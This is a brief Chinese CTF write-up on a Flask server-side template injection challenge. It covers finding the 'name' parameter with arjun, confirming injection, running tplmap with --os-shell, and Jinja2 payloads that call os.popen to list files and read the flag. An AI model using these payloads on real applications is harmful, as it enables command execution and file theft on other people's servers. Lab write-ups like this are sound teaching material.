1.arjun工具

这是个解析http参数的工具。

用户可以使用下列命令查找GET参数：

python3 arjun.py -u http://c7bb25cf-ab60-4b15-b3c7-c7e75d46691c.node3.buuoj.cn/ --get

类似的，用户可以使用—post来查找POST请求。

使用方法

一般情况下就用上面的命令就可了。

这个因为环境反应速度太慢了，没搞出来，有点小小的遗憾吧。

但是看wp得知这个有个get的参数name。

2.模版注入

根据提示flask想到是模版注入，传参/?name={{7*7}}，返回的内容为I ♥ Flask & 49可判断确实是模版注入，那用得是哪个模板呢？

3.tplmap工具

这个工具是个判断用的是哪个框架的工具，具体的使用方法就是

python ./tplmap.py -u 'http://www.target.com/page?name=John'

就是想上面那样用，然后对于我们这道题，利用的语句就是
python tplmap.py -u http://c7bb25cf-ab60-4b15-b3c7-c7e75d46691c.node3.buuoj.cn/?name= --os-shell

~

下面是jinja2模版注入的常用payload，网上别人总结的一大堆，有空可总结一下。

/?name={{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

/?name={{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}

直接获得flag。
